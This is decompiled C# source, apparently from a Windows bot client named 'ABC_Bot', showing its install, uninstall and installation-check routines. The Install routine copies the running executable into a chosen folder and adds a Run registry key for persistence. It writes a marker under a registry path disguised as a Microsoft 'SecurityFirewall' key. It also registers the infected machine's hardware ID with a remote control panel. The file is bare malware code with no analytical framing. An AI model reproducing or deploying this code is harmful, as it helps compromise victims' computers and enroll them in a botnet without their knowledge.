using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

[StandardModule]
internal sealed class mod_install
{
	public static object uninstall()
	{
		mod_registry.RegDelete("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + main.name);
		mod_registry.RegDelete("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install");
		object result = default(object);
		return result;
	}

	public static object isInstalled()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 128:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0031;
						case 5:
							goto IL_003f;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 7:
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003f:
					num = 5;
					break;
					IL_0031:
					num = 3;
					obj = true;
					goto end_IL_0000_3;
					IL_0008:
					num = 2;
					if (Operators.CompareString(Application.get_ExecutablePath(), main.dir + "\\" + main.name + ".exe", false) == 0)
					{
						goto IL_0031;
					}
					goto IL_003f;
					end_IL_0000_2:
					break;
				}
				num = 6;
				obj = false;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 128;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object Install()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 324:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
						case 5:
							goto IL_004c;
						case 6:
							goto IL_0072;
						case 7:
							goto IL_00c4;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
						case 10:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00c4:
					num = 7;
					if (!Operators.ConditionalCompareObjectEqual(mod_wrequest.request(main.panel, Conversions.ToString(Operators.AddObject((object)"action=install&hwid=", mod_hwid.hwid()))), (object)"True", false))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0072:
					num = 6;
					mod_registry.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + main.name, "\"" + main.dir + "\\" + main.name + ".exe\"");
					goto IL_00c4;
					IL_0008:
					num = 2;
					if (File.Exists(main.dir + "\\" + main.name + ".exe"))
					{
						goto IL_002b;
					}
					goto IL_004c;
					IL_002b:
					num = 3;
					File.Delete(main.dir + "\\" + main.name + ".exe");
					goto IL_004c;
					IL_004c:
					num = 5;
					File.Copy(Application.get_ExecutablePath(), main.dir + "\\" + main.name + ".exe");
					goto IL_0072;
					end_IL_0000_2:
					break;
				}
				num = 8;
				mod_registry.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install", "True");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 324;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
